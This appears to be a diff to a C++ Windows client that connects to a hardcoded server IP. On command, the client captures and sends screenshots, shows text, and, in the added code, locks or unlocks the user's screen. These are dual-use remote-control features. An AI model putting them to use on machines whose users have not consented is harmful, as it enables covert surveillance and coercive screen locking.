@@ -1,18 +1,44 @@
 #include <iostream>
 #include <boost/asio.hpp>
-#include <windows.h>
 #include <opencv2/opencv.hpp>
+#include <Windows.h>
 
 #include "Header.h"
 #include "AckHeader.h"
+#include "ScreenLocker.h"
 
 using namespace std;
 
 const std::string kServerIpAddress = "94.194.236.180";
 const unsigned short kServerPort = 12345;
 
+bool b_locked = false;
+bool lockRequestInProgress = false;
+bool unlockRequestInProgress = false;
+
 void readTextData(boost::asio::ip::tcp::socket& socket_, Header& header_);
 void sendScreenshot(boost::asio::ip::tcp::socket& socket);
+
+
+void lockScreen(ScreenLocker* lockscreen_handle) {
+    if (!b_locked && !lockRequestInProgress && !unlockRequestInProgress) {
+        lockRequestInProgress = true;
+        lockscreen_handle->runInThread();
+        b_locked = true;
+        lockRequestInProgress = false;
+    }
+}
+
+void unlockScreen(ScreenLocker* lockscreen_handle) {
+    if (b_locked && !lockRequestInProgress && !unlockRequestInProgress) {
+        unlockRequestInProgress = true;
+        lockscreen_handle->closeWindow();
+        lockscreen_handle->waitForThread();
+        b_locked = false;
+        unlockRequestInProgress = false;
+    }
+}
+
 
 std::vector<u_char> takeScreenshot()
 {
@@ -58,7 +84,7 @@ std::vector<u_char> takeScreenshot()
     return compressedData;
 }
 
-void readHeader(boost::asio::ip::tcp::socket& socket_) {
+void readHeader(boost::asio::ip::tcp::socket& socket_, ScreenLocker* lockscreen_handler) {
     while (true) {
         std::cout << "WAIT FOR PACKET" << std::endl;
         
@@ -70,6 +96,12 @@ void readHeader(boost::asio::ip::tcp::socket& socket_) {
         switch (header_.type) {
         case TEXT:
             readTextData(socket_, header_);
+            break;
+        case LOCK_SCREEN:
+            lockScreen(lockscreen_handler);
+            break;
+        case UNLOCK_SCREEN:
+            unlockScreen(lockscreen_handler);
             break;
         case SCREENSHOT:
             sendScreenshot(socket_);
@@ -140,6 +172,9 @@ void sendScreenshot(boost::asio::ip::tcp::socket& socket) {
 
 using namespace std;
 int main() {
+
+    ScreenLocker* lockscreen_handler = new ScreenLocker();
+
     try {
         boost::asio::io_context io_context;
         boost::asio::ip::tcp::resolver resolver(io_context);
@@ -147,7 +182,9 @@ int main() {
         boost::asio::ip::tcp::socket socket(io_context);
         boost::asio::connect(socket, endpoints);
 
-        std::thread readHeader_thread(readHeader, std::ref(socket));
+        std::thread readHeader_thread(readHeader, std::ref(socket), lockscreen_handler);
+
+
 
         readHeader_thread.join();
     }
